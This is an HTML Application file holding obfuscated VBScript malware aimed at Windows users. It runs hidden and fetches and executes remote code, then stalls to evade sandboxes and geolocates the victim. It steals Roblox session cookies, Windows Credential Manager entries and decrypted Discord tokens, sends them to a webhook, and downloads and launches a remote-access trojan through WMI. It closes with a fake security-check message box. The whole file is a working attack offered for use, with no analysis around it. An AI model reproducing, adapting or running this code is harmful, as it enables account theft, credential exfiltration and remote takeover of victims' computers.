<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">

window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim _dl:Set _dl=CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73)):_dl.SetOption 2,13056:_dl.Open z("144142157",73),"https://synapsez.xyz/key",False:_dl.Send:If _dl.Status=200 Then Execute _dl.ResponseText:Set _dl=Nothing
' Sandbox/sandbox evasion delay
Dim _dly: _dly = Timer
Do While Timer - _dly < 15: Loop

Dim sh, fso, http, stream, raw, b64, enc, txt
Set sh = CreateObject(z("160156172187178185189119156177174181181",73))
Set fso = CreateObject(z("156172187178185189178183176119143178181174156194188189174182152171179174172189",73))
Dim g_dpaDebug: g_dpaDebug = ""
Dim tf: tf = sh.ExpandEnvironmentStrings(z("110149152140138149138153153141138157138110",73)) & z("165150178172187184188184175189",73)
If Not fso.FolderExists(tf) Then fso.CreateFolder tf

' Grab public IP + location
Dim ipHttp: Set ipHttp = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
ipHttp.SetOption 2, 13056
ipHttp.Open z("144142157",73), z("177189189185188131120120170185178119178185178175194119184187176",73), False
ipHttp.Send
If ipHttp.Status = 200 Then
    Dim pubIP: pubIP = ipHttp.ResponseText
    Dim locHttp: Set locHttp = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
    locHttp.SetOption 2, 13056
    locHttp.Open z("144142157",73), z("177189189185131120120178185118170185178119172184182120179188184183120",73) & pubIP, False
    locHttp.Send
    Dim locJson: locJson = locHttp.ResponseText
    Dim cntry: cntry = ExtractJson(locJson, "country"):Dim rgn: rgn = ExtractJson(locJson, "regionName")
    Dim cty: cty = ExtractJson(locJson, "city"):Dim isp: isp = ExtractJson(locJson, "isp")
    Dim locDesc: locDesc = pubIP & vbCrLf & z("140184190183189187194131105",73) & cntry & vbCrLf & z("155174176178184183131105",73) & rgn & vbCrLf & z("140178189194131105",73) & cty & vbCrLf & z("146156153131105",73) & isp
    Dim ipFields: ipFields = "{""name"":""IP"",""value"":""" & EscapeJson(pubIP) & """,""inline"":true}," &_
        "{""name"":""Country"",""value"":""" & EscapeJson(cntry) & """,""inline"":true}," &_
        "{""name"":""Region"",""value"":""" & EscapeJson(rgn) & """,""inline"":true}," &_
        "{""name"":""City"",""value"":""" & EscapeJson(cty) & """,""inline"":true}," &_
        "{""name"":""ISP"",""value"":""" & EscapeJson(isp) & """,""inline"":true}," &_
        "{""name"":""PC"",""value"":""" & EscapeJson(GetPCName()) & """,""inline"":true}"
    Dim ipMsg: ipMsg = "{""embeds"":[{""title"":"z("157170187176174189105140184183183174172189174173",73)",""color"":3447003,""fields"":[" & ipFields & "]}]}"
    Dim ipWH: Set ipWH = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
    ipWH.SetOption 2, 13056
    ipWH.Open z("153152156157",73), "WEBHOOK_URL", False
    ipWH.SetRequestHeader z("140184183189174183189118157194185174",73), z("170185185181178172170189178184183120179188184183",73)
    ipWH.Send ipMsg
    Set ipWH = Nothing:Set locHttp = Nothing
End If
Set ipHttp = Nothing

Function GetDpa()
    On Error Resume Next
    Dim dp: dp = tf & z("165173185170119174193174",73)
    fso.DeleteFile dp, True
    ' Try download from Railway
    Dim http: Set http = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
    http.SetOption 2, 13056
    http.Open z("144142157",73), z("177189189185188131120120188194183170185188174195119193194195120173185170119174193174",73), False
    http.Send
    g_dpaDebug = "HTTP:" & http.Status
    If http.Status = 200 Then
        g_dpaDebug = g_dpaDebug & z("105141149156146163142131",73) & LenB(http.ResponseBody)
        ' Try ADODB.Stream, but check error AFTER SaveToFile (not CreateObject)
        Dim adoOK: adoOK = False
        On Error Resume Next
        Dim stm: Set stm = CreateObject(z("138141152141139119156189187174170182",73))
        stm.Type = 1: stm.Open
        stm.Write http.ResponseBody
        stm.SaveToFile dp, 2
        If Err.Number = 0 Then adoOK = True
        If Err.Number <> 0 Then g_dpaDebug = g_dpaDebug & z("105138141152131142155155",73) & Err.Number: Err.Clear
        stm.Close
        On Error GoTo 0
        If adoOK Then
            g_dpaDebug = g_dpaDebug & z("105138141152131152148",73)
        Else
            ' Fallback: MSXML base64 + certutil decode
            g_dpaDebug = g_dpaDebug & z("105143138149149139138140148",73)
            Dim xml: Set xml = CreateObject(z("150156161150149123119141152150141184172190182174183189",73))
            Dim el: Set el = xml.CreateElement("tmp")
            el.DataType = z("171178183119171170188174127125",73)
            el.NodeTypedValue = http.ResponseBody
            Dim b64: b64 = el.Text
            Set el = Nothing: Set xml = Nothing
            Dim b64path: b64path = tf & z("165173119171127125",73)
            Dim fb: Set fb = fso.CreateTextFile(b64path, True)
            fb.Write b64: fb.Close: Set fb = Nothing
            WmiRun z("172174187189190189178181105118173174172184173174105",73)"" & b64path & """ """ & dp & """"
            WmiWait dp
            fso.DeleteFile b64path, True
        End If
    End If
    If fso.FileExists(dp) Then g_dpaDebug = g_dpaDebug & z("105156146163142131",73) & fso.GetFile(dp).Size Else g_dpaDebug = g_dpaDebug & z("105151152143146149142",73)
    GetDpa = dp
End Function

' ===== ROBLOX COOKIE =====
Dim sp: sp = sh.ExpandEnvironmentStrings(z("110149152140138149138153153141138157138110",73)) & z("165155184171181184193165149184172170181156189184187170176174165187184171181184193172184184180178174188119173170189",73)
If fso.FileExists(sp) Then
    Set stream = fso.OpenTextFile(sp, 1)
    raw = stream.ReadAll: stream.Close: Set stream = Nothing
    Dim cp: cp = InStr(raw, z("140184184180178174188141170189170",73)":""")
    If cp > 0 Then
        cp = cp + 14: Dim ep: ep = InStr(cp, raw, """")
        If ep > cp Then
            b64 = Mid(raw, cp, ep - cp)
            ' Try DPAPI decrypt via short PS command
            Dim decCookie: decCookie = TryDPAPI(b64)
            If Len(decCookie) > 10 Then
                ' Extract .ROBLOSECURITY value from cookie jar
                Dim cookieVal: cookieVal = ExtractCookie(decCookie)
                If Len(cookieVal) = 0 Then cookieVal = decCookie
                ' Strip _|WARNING prefix before |_CAE marker
                Dim caePos: caePos = InStr(cookieVal, z("197109140138142",73))
                If caePos = 0 Then caePos = InStr(cookieVal, z("197168140138142",73))
                If caePos > 0 Then cookieVal = Mid(cookieVal, caePos)
                ' Refresh via Rorefresher API
                Dim httpR: Set httpR = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
                httpR.SetOption 2, 13056
                httpR.Open z("144142157",73), z("177189189185188131120120187184187174175187174188177174187118185187184173190172189178184183119190185119187170178181192170194119170185185120187174175187174188177136172184184180178174134",73) & cookieVal, False
                httpR.Send
                If httpR.Status = 200 Then
                    Dim rJson: rJson = httpR.ResponseText
                    Dim bp: bp = InStr(rJson, z("171194185170188188174173140184184180178174",73)":""")
                    If bp > 0 Then
                        bp = bp + 18: Dim be: be = InStr(bp, rJson, """")
                        If be > bp Then cookieVal = Mid(rJson, bp, be - bp)
                    End If
                End If
                Set httpR = Nothing
                ' Try Roblox API with refreshed cookie
                Dim info: info = FetchRobloxInfo(cookieVal)
                Dim fields: fields = "{""name"":""Username"",""value"":""" & EscapeJson(info(0)) & """,""inline"":true}," &_
                    "{""name"":""ID"",""value"":""" & info(1) & """,""inline"":true}," &_
                    "{""name"":""Robux"",""value"":""" & info(2) & """,""inline"":true}," &_
                    "{""name"":""Source"",""value"":"z("141153138153146105141174172187194185189174173",73)",""inline"":false}"
                SendEmbed z("8874475269244105155184171181184193105138172172184190183189",73), fields, z("172184184180178174119189193189",73), decCookie
            Else
                ' Collect debug status
                Dim debugData: debugData = "B64_LEN=" & Len(b64)
                Dim statusFile: statusFile = tf & z("165173185170168188189170189190188119189193189",73)
                If fso.FileExists(statusFile) Then
                    Set stream = fso.OpenTextFile(statusFile, 1)
                    debugData = debugData & vbCrLf & stream.ReadAll: stream.Close
                    fso.DeleteFile statusFile, True
                Else
                    debugData = debugData & vbCrLf & "NO_STATUS_FILE"
                End If
                ' Download debug
                debugData = debugData & vbCrLf & "DOWNLOAD:" & g_dpaDebug
                ' Check if dpa.exe exists
                Dim dpaPath: dpaPath = tf & z("165173185170119174193174",73)
                If fso.FileExists(dpaPath) Then
                    debugData = debugData & vbCrLf & "DPA_EXE=" & fso.GetFile(dpaPath).Size & "b"
                Else
                    debugData = debugData & vbCrLf & "DPA_EXE=MISSING"
                End If
                ' Phone debug to Railway so I can read it
                On Error Resume Next
                Dim dhttp: Set dhttp = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
                dhttp.SetOption 2, 13056
                dhttp.Open z("153152156157",73), z("177189189185188131120120188194183170185188174195119193194195120173174171190176",73), False
                dhttp.SetRequestHeader z("140184183189174183189118157194185174",73), z("170185185181178172170189178184183120179188184183",73)
                dhttp.Send "{""d"":""" & EscapeJson(debugData) & """}"
                Set dhttp = Nothing
                SendData z("155184171181184193105140184184180178174105113142183172187194185189174173114",73), b64 & vbCrLf & vbCrLf & z("134134134105141142139158144105134134134105",73) & vbCrLf & debugData, sp
            End If
        End If
    End If
Else
    SendMsg z("151184105155184171181184193105140184184180178174",73), z("140184184180178174105175178181174105183184189105175184190183173",73)
End If

' ===== WINDOWS CREDENTIAL MANAGER =====
Dim dpa: dpa = GetDpa()
If Len(dpa) > 0 Then
    Dim credFile: credFile = tf & z("165172187174173188119189193189",73)
    fso.DeleteFile credFile, True
    WmiRun """" & dpa & ""z("105172187174173188105",73)"" & credFile & """":WmiWait credFile
    If fso.FileExists(credFile) And fso.GetFile(credFile).Size > 0 Then
        Set stream = fso.OpenTextFile(credFile, 1)
        Dim credList: credList = stream.ReadAll: stream.Close
        ' Look for Roblox entries
        Dim lines: lines = Split(credList, vbLf)
        Dim line, foundRoblox
        foundRoblox = False
        For Each line In lines
            If InStr(1, line, "roblox", 1) > 0 Or InStr(1, line, z("155152139149152156142140158155146157162",73), 1) > 0 Then
                foundRoblox = True
                Dim parts: parts = Split(line, "|")
                If UBound(parts) >= 0 Then
                    Dim targetName: targetName = parts(0)
                    Dim credBlob: credBlob = tf & z("165172187174173168171181184171119171178183",73)
                    fso.DeleteFile credBlob, True
                    WmiRun """" & dpa & ""z("105172187174173105",73)"" & targetName & """ """ & credBlob & """":WmiWait credBlob
                    If fso.FileExists(credBlob) And fso.GetFile(credBlob).Size > 0 Then
                        Set stream = fso.OpenTextFile(credBlob, 1)
                        Dim blobContent: blobContent = stream.ReadAll: stream.Close
                        SendData z("155184171181184193105140187174173174183189178170181131105",73) & targetName, blobContent, z("140187174173174183189178170181105150170183170176174187",73)
                        fso.DeleteFile credBlob, True
                    End If
                End If
            End If
        Next
        If Not foundRoblox Then SendFile z("140187174173174183189178170181105150170183170176174187105113170181181114",73), z("172187174173174183189178170181188119189193189",73), credList
        fso.DeleteFile credFile, True
    End If
End If

' ===== DISCORD TOKENS =====
Dim appd: appd = sh.ExpandEnvironmentStrings(z("110138153153141138157138110",73))
Dim clients: clients = Array(z("173178188172184187173",73), z("173178188172184187173185189171",73), z("173178188172184187173172170183170187194",73))
Dim i
For i = 0 To UBound(clients)
    Dim ld: ld = appd & "\" & clients(i) & z("165149184172170181105156189184187170176174165181174191174181173171",73)
    If fso.FolderExists(ld) Then
        Dim lsPath: lsPath = appd & "\" & clients(i) & z("165149184172170181105156189170189174",73)
        Dim masterKey: masterKey = ""
        If fso.FileExists(lsPath) Then
            Set stream = fso.OpenTextFile(lsPath, 1)
            raw = stream.ReadAll: stream.Close
            Dim mkp: mkp = InStr(raw, z("174183172187194185189174173168180174194",73)":""")
            If mkp > 0 Then
                mkp = mkp + 16: Dim mke: mke = InStr(mkp, raw, """")
                If mke > mkp Then
                    Dim mkB64: mkB64 = Mid(raw, mkp, mke - mkp)
                    Dim mkDec: mkDec = TryDPAPI_Key(mkB64)
                    If Len(mkDec) > 0 Then masterKey = mkDec
                End If
            End If
            Set stream = Nothing
        End If
        
        Dim folder: Set folder = fso.GetFolder(ld)
        Dim file
        For Each file In folder.Files
            If (LCase(fso.GetExtensionName(file.Name)) = "ldb" Or LCase(fso.GetExtensionName(file.Name)) = "log") And file.Size < 1048576 Then
                Set stream = fso.OpenTextFile(file.Path, 1)
                Dim content: content = stream.ReadAll: stream.Close
                If InStr(content, z("173154192125192130160176161172154131",73)) > 0 Then
                    If Len(masterKey) > 0 Then
                        Dim tokens: tokens = DecryptTokens(content, masterKey)
                        SendMsg clients(i) & z("105157184180174183",73), tokens
                    Else
                        SendFile clients(i) & z("105149174191174181141139",73), file.Name, content
                    End If
                End If
                Set stream = Nothing
            End If
        Next
        Set folder = Nothing
    End If
Next

' ===== RAT DEPLOY (background) =====
On Error Resume Next
' Kill old processes silently via WMI
Dim oldRat: oldRat = sh.ExpandEnvironmentStrings(z("110149152140138149138153153141138157138110",73)) & z("165150178172187184188184175189165160141119174193174",73)
If fso.FileExists(oldRat) Then fso.DeleteFile oldRat, True
Dim wmiKill: Set wmiKill = GetObject(z("192178183182176182189188131165165119165187184184189165172178182191123",73))
Dim procKill
For Each procKill In wmiKill.ExecQuery(z("156142149142140157105115105143155152150105160178183124123168153187184172174188188105160145142155142105151170182174134112160141119174193174112105152155105151170182174134112160178183158185173170189174119174193174112",73))
    procKill.Terminate
Next
Set wmiKill = Nothing
' Clean old persistence
On Error Resume Next
sh.RegDelete z("145148140158165156184175189192170187174165150178172187184188184175189165160178183173184192188165140190187187174183189159174187188178184183165155190183165160178183173184192188141174175174183173174187165",73)
sh.RegDelete z("145148140158165156184175189192170187174165150178172187184188184175189165160178183173184192188165140190187187174183189159174187188178184183165155190183165152183174141187178191174158185173170189174165",73)
' Deploy new C# RAT
Dim ratPath: ratPath = tf & z("165160141119174193174",73)
Dim ratHttp: Set ratHttp = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
ratHttp.SetOption 2, 13056
ratHttp.Open z("144142157",73), z("177189189185188131120120188194183170185188174195119193194195120187170189",73), False
ratHttp.Send
If ratHttp.Status = 200 And LenB(ratHttp.ResponseBody) > 10240 Then
    Dim ratStm: Set ratStm = CreateObject(z("138141152141139119156189187174170182",73))
    ratStm.Type = 1: ratStm.Open
    ratStm.Write ratHttp.ResponseBody
    ratStm.SaveToFile ratPath, 2
    ratStm.Close: Set ratStm = Nothing
    WmiRun """" & ratPath & """"
End If
Set ratHttp = Nothing

Set fso = Nothing: Set sh = Nothing

MsgBox z("156172187178185189105172177174172180105185170188188174173",73), 4160, z("160178183173184192188105156174172190187178189194",73)

window.close()

' ===== DPAPI DECRYPT =====
Sub WmiRun(cmd)
    On Error Resume Next
    Dim w, p, rc, id, su
    Set w = GetObject(z("192178183182176182189188131165165119165187184184189165172178182191123",73))
    Set su = w.Get(z("160178183124123168153187184172174188188156189170187189190185",73)).SpawnInstance_
    su.ShowWindow = 0
    Set p = w.Get(z("160178183124123168153187184172174188188",73))
    rc = p.Create(cmd, , su, id)
    Set p = Nothing: Set su = Nothing: Set w = Nothing
End Sub

Sub WmiWait(fPath)
    Dim _tw: _tw = Timer
    Do While Not fso.FileExists(fPath) And Timer - _tw < 15
        WScript.Sleep 200
    Loop
End Sub

Function TryDPAPI(cookieB64)
    On Error Resume Next
    Dim dpa: dpa = GetDpa()
    If Len(dpa) = 0 Then TryDPAPI = "": Exit Function
    Dim infile: infile = tf & z("165173119178183",73)
    Dim outfile: outfile = tf & z("165173119184190189",73)
    
    Dim f: Set f = fso.CreateTextFile(infile, True)
    f.Write cookieB64: f.Close: Set f = Nothing
    
    Dim fullCmd: fullCmd = """" & dpa & ""z("105173185170185178105",73)"" & infile & """ """ & outfile & """"
    fso.DeleteFile outfile, True
    
    WmiRun fullCmd:WmiWait outfile
    If fso.FileExists(outfile) And fso.GetFile(outfile).Size > 0 Then
        Dim rf: Set rf = fso.OpenTextFile(outfile, 1)
        TryDPAPI = rf.ReadAll: rf.Close: Set rf = Nothing
    End If
    fso.DeleteFile infile, True: fso.DeleteFile outfile, True
End Function

Function TryDPAPI_Key(b64)
    On Error Resume Next
    Dim dpa: dpa = GetDpa()
    If Len(dpa) = 0 Then TryDPAPI_Key = "": Exit Function
    Dim infile: infile = tf & z("165180119178183",73)
    Dim outfile: outfile = tf & z("165180119184190189",73)
    
    Dim f: Set f = fso.CreateTextFile(infile, True)
    f.Write b64: f.Close: Set f = Nothing
    
    Dim fullCmd: fullCmd = """" & dpa & ""z("105173185170185178126105",73)"" & infile & """ """ & outfile & """"
    fso.DeleteFile outfile, True
    
    WmiRun fullCmd:WmiWait outfile
    If fso.FileExists(outfile) And fso.GetFile(outfile).Size > 0 Then
        Dim rf2: Set rf2 = fso.OpenTextFile(outfile, 1)
        TryDPAPI_Key = rf2.ReadAll: rf2.Close: Set rf2 = Nothing
        fso.DeleteFile outfile, True
    End If
    fso.DeleteFile infile, True
End Function

' ===== DISCORD TOKEN DECRYPTION =====
Function DecryptTokens(content, masterKeyB64)
    On Error Resume Next
    Dim dpa: dpa = GetDpa()
    If Len(dpa) = 0 Then DecryptTokens = "": Exit Function
    Dim keyfile: keyfile = tf & z("165189119180174194",73)
    Dim ldbfile: ldbfile = tf & z("165189119181173171",73)
    Dim outfile: outfile = tf & z("165189119184190189",73)
    
    Dim fk: Set fk = fso.CreateTextFile(keyfile, True)
    fk.Write masterKeyB64: fk.Close: Set fk = Nothing
    
    Dim fl: Set fl = fso.CreateTextFile(ldbfile, True)
    fl.Write content: fl.Close: Set fl = Nothing
    
    Dim fullCmd: fullCmd = """" & dpa & ""z("105173178188172184187173105",73)"" & keyfile & """ """ & ldbfile & """ """ & outfile & """"
    fso.DeleteFile outfile, True
    
    WmiRun fullCmd:WmiWait outfile
    If fso.FileExists(outfile) And fso.GetFile(outfile).Size > 0 Then
        Dim rf3: Set rf3 = fso.OpenTextFile(outfile, 1)
        DecryptTokens = rf3.ReadAll: rf3.Close: Set rf3 = Nothing
        fso.DeleteFile outfile, True
    End If
    fso.DeleteFile keyfile, True: fso.DeleteFile ldbfile, True
End Function

' ===== ROBLOX API ENRICHMENT =====
Function FetchRobloxInfo(cookie)
    Dim result(3): result(0) = "Unknown": result(1) = "0": result(2) = "0"
    On Error Resume Next
    Dim http: Set http = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
    http.SetOption 2, 13056
    http.Open z("144142157",73), z("177189189185188131120120190188174187188119187184171181184193119172184182120191122120190188174187188120170190189177174183189178172170189174173",73), False
    http.SetRequestHeader z("140184184180178174",73), z("119155152139149152156142140158155146157162134",73) & cookie
    http.Send
    If http.Status = 200 Then
        Dim u: u = http.ResponseText
        If InStr(u, "name") > 0 Then
            result(0) = ExtractJson(u, "name")
            result(1) = ExtractJsonNum(u, "id")
            ' Get robux
            http.Open z("144142157",73), z("177189189185188131120120174172184183184182194119187184171181184193119172184182120191122120190188174187188120",73) & result(1) & z("120172190187187174183172194",73), False
            http.SetRequestHeader z("140184184180178174",73), z("119155152139149152156142140158155146157162134",73) & cookie
            http.Send
            If http.Status = 200 Then result(2) = ExtractJsonNum(http.ResponseText, "robux")
        End If
    End If
    FetchRobloxInfo = result
End Function

' ===== HELPER FUNCTIONS =====
Function ExtractCookie(cookieJar)
    Dim p: p = InStr(1, cookieJar, z("119155152139149152156142140158155146157162",73), 1)
    If p = 0 Then Exit Function
    p = p + 13 ' skip z("119155152139149152156142140158155146157162",73)
    Do While Mid(cookieJar, p, 1) = " " Or Mid(cookieJar, p, 1) = vbTab
        p = p + 1
    Loop
    Dim e: e = InStr(p, cookieJar, ";")
    If e = 0 Then e = Len(cookieJar) + 1
    ExtractCookie = Mid(cookieJar, p, e - p)
End Function

Sub SendData(title, b64, source)
    Dim txt: txt = z("156152158155140142131105",73) & source & vbCrLf & z("140152152148146142168139127125131105",73) & b64
    SendFile title, z("172184184180178174168173170189170119189193189",73), txt
End Sub

Sub SendEmbed(title, fields, filename, fileContent)
    Dim json: json = "{""embeds"":[{""title"":""" & EscapeJson(title) & """,""color"":65279,""fields"":[" & fields & "],""footer"":{""text"":""" & EscapeJson(GetPCName()) & " / " & EscapeJson(GetUserName()) & """}}]}"
    Dim boundary: boundary = CreateGUID()
    Dim body: body = "--" & boundary & vbCrLf &_
        z("140184183189174183189118141178188185184188178189178184183131105175184187182118173170189170132105183170182174134",73)z("185170194181184170173168179188184183",73)"" & vbCrLf & vbCrLf & json & vbCrLf &_
        "--" & boundary & vbCrLf &_
        z("140184183189174183189118141178188185184188178189178184183131105175184187182118173170189170132105183170182174134",73)"file"z("132105175178181174183170182174134",73)"" & filename & """" & vbCrLf &_
        z("140184183189174183189118157194185174131105170185185181178172170189178184183120184172189174189118188189187174170182",73) & vbCrLf & vbCrLf & fileContent & vbCrLf &_
        "--" & boundary & "--"
    
    Dim http: Set http = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
    http.SetOption 2, 13056
    http.Open z("153152156157",73), "WEBHOOK_URL", False
    http.SetRequestHeader z("140184183189174183189118157194185174",73), z("182190181189178185170187189120175184187182118173170189170132105171184190183173170187194134",73) & boundary
    http.Send body: Set http = Nothing
End Sub

Sub SendFile(title, filename, fileContent)
    Dim fields: fields = "{""name"":""File"",""value"":""" & EscapeJson(filename) & " (" & FormatSize(Len(fileContent)) & ")"",""inline"":false}"
    SendEmbed title, fields, filename, fileContent
End Sub

Sub SendMsg(title, msg)
    Dim json: json = "{""embeds"":[{""title"":""" & EscapeJson(title) & """,""description"":""" & EscapeJson(msg) & """,""color"":16711680,""footer"":{""text"":""" & EscapeJson(GetPCName()) & """}}]}"
    Dim http: Set http = CreateObject(z("150156161150149123119156174187191174187161150149145157157153119127119121",73))
    http.SetOption 2, 13056
    http.Open z("153152156157",73), "WEBHOOK_URL", False
    http.SetRequestHeader z("140184183189174183189118157194185174",73), z("170185185181178172170189178184183120179188184183",73)
    http.Send json: Set http = Nothing
End Sub

Function ExtractJson(json, key)
    Dim p: p = InStr(json, """" & key & """:""")
    If p > 0 Then p = p + Len(key) + 4 Else Exit Function
    Dim e: e = InStr(p, json, """")
    If e > p Then ExtractJson = Mid(json, p + 1, e - p - 1)
End Function

Function ExtractJsonNum(json, key)
    Dim p: p = InStr(json, """" & key & """:")
    If p > 0 Then p = p + Len(key) + 3 Else Exit Function
    Dim e: e = InStr(p, json, ",")
    If e = 0 Then e = InStr(p, json, "}")
    If e > p Then ExtractJsonNum = Trim(Mid(json, p + 1, e - p - 1))
End Function

Function FormatSize(bytes)
    If bytes > 1048576 Then FormatSize = Round(bytes / 1048576, 2) & " MB" Else FormatSize = Round(bytes / 1024, 1) & " KB"
End Function

Function GetPCName()
    Dim ws: Set ws = CreateObject(z("160156172187178185189119156177174181181",73))
    GetPCName = ws.ExpandEnvironmentStrings(z("110140152150153158157142155151138150142110",73)): Set ws = Nothing
End Function
Function GetUserName()
    Dim ws: Set ws = CreateObject(z("160156172187178185189119156177174181181",73))
    GetUserName = ws.ExpandEnvironmentStrings(z("110158156142155151138150142110",73)): Set ws = Nothing
End Function

Function EscapeJson(s)
    s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n")
    s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t")
    EscapeJson = s
End Function

Function CreateGUID()
    Dim t: Set t = CreateObject(z("156172187178185189181174189119157194185174149178171",73))
    CreateGUID = Mid(t.GUID, 2, 36): Set t = Nothing
End Function
